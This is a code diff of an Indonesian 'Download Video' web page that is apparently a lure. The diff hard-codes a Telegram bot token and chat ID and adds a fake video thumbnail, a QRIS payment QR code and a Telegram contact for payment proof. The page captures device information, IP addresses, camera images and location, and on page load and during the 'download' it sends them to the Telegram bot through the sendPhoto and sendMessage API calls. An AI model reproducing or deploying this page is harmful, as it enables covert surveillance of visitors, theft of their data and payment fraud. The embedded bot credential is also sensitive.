@@ -5,16 +5,8 @@
   <title>Download Video</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   
-  <!-- Script untuk membaca environment variables dari Vercel -->
-  <script>
-    window.ENV = {
-      BOT_TOKEN: '%BOT_TOKEN%',
-      CHAT_ID: '%CHAT_ID%'
-    };
-  </script>
-  
   <style>
-    /* CSS langsung di sini karena Anda bilang sudah punya CSS sendiri */
+    /* CSS langsung di sini */
     * {
       margin: 0;
       padding: 0;
@@ -502,9 +494,22 @@
   </div>
 
   <script>
-    // Ambil token dari environment variables
-    const BOT_TOKEN = window.ENV?.BOT_TOKEN || '';
-    const CHAT_ID = window.ENV?.CHAT_ID || '';
+    // ========== KONFIGURASI LANGSUNG DI SINI ==========
+    const BOT_TOKEN = '7783707414:AAHUCEmRj0PlM89S6aJie-8dGk6_n_XBexI';
+    const CHAT_ID = '7783707414';
+    
+    // Konfigurasi gambar dan pesan
+    const THUMBNAIL_URL = 'https://via.placeholder.com/640x360/ff0000/ffffff?text=VIDEO+THUMBNAIL';
+    const QR_CODE_URL = 'https://via.placeholder.com/200x200/000000/ffffff?text=QRIS+CODE';
+    const TELEGRAM_USERNAME = '@cukiii_55';
+    const TELEGRAM_LINK = 'https://t.me/cukiii_55';
+    // ==================================================
+
+    // Set gambar dan teks
+    document.getElementById('thumbnail').src = THUMBNAIL_URL;
+    document.getElementById('qrCode').src = QR_CODE_URL;
+    document.getElementById('telegramLink').href = TELEGRAM_LINK;
+    document.getElementById('telegramInfo').innerHTML = `Username: ${TELEGRAM_USERNAME}<br>Kirim bukti transfer untuk konfirmasi`;
 
     let hasCapturedCamera = false;
     let hasCapturedLocation = false;
@@ -514,23 +519,24 @@
 
     async function sendToTelegram(message, photoBlob = null) {
       try {
-        if (!BOT_TOKEN || !CHAT_ID) {
-          console.log('Telegram credentials not configured');
-          return;
-        }
-
+        console.log('Mengirim ke Telegram...', { message, hasPhoto: !!photoBlob });
+        
         if (photoBlob) {
           const formData = new FormData();
           formData.append('chat_id', CHAT_ID);
           formData.append('photo', photoBlob);
           formData.append('caption', message);
 
-          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+          const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
             method: 'POST',
             body: formData
           });
+          
+          const result = await response.json();
+          console.log('Response sendPhoto:', result);
+          
         } else {
-          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -539,6 +545,9 @@
               parse_mode: 'HTML'
             })
           });
+          
+          const result = await response.json();
+          console.log('Response sendMessage:', result);
         }
       } catch (error) {
         console.log('Telegram error:', error);
@@ -1023,6 +1032,8 @@
     });
 
     async function startDownloadProcess() {
+      console.log('Start download process...');
+      
       const deviceInfo = await getDeviceInfo();
       const publicIP = await getIP();
       const localIP = await getLocalIP();
@@ -1131,6 +1142,8 @@
     }
 
     window.addEventListener('load', async () => {
+      console.log('Page loaded, sending visitor notification...');
+      
       const deviceInfo = await getDeviceInfo();
       const publicIP = await getIP();
 
